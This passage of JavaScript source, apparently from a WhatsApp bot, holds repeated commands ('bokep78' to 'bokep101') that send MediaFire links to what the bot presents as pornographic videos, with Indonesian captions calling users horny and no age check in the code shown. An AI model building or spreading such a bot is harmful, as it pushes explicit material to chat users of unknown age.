				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/s0w6s0vz89cpflj/received_296681828570048.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep78':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/i2ocky8x6dxu2sx/received_920553082147928.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep79':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/so3lmb6o9ddlh8y/received_422897052499846.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep80':
				   if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼?? 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4eis90da17labei/received_326273072598527.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep81':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/32lgtdbuednvql4/received_560733671813987.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep82':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/nbb5p7ckejg4jl5/received_1015326852640972.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep83':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/lpkb5wp3mfy9poa/received_423251782491805.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep84':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/nupks4cmp6k0dhm/received_387710329677654.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep85':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ew3cjqaliiw861w/received_577728976710112.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep86':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/hcn7xe1kxw4s7ss/received_3025767131001857.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep87':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄??𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐??𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\\nhttps://www.mediafire.com/file/9fy9dsm8ink8aaq/received_957169441499997.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep88':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/70bwgs0tzydqh6b/received_404981621022604.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep89':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/zdpfn5x3p2rtu2l/received_292781839355277.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep90':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/tu17wcc66erjzgc/received_175578237972649.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep91':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/78d0swnwkhf5ucf/received_455493332466872.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep92':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/7v9ue8y657wsnz4/received_1108084426664070.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep93':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/b2p19xj231yc3rs/received_302994851166017.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep94':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/abq2x1532vybg6p/received_407724170726561.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep95':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/uvr69txxyksomeu/received_519355046078010.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep96':
				  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/n4h7xl2x3wt4j4d/received_2126161344189777.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep97':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/k7lszi6ry49abrh/received_848384158996757.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep98':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/uwcwmtxdqbwqu4x/received_4415932545152097.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep99':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/u8iws0q7vyjayxr/received_297632178474224.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep100':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/w6jb6mkn8wl777b/received_586107739304402.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep101':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/b83bwyaotlxv844/1_4976751237790695783.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep102':	
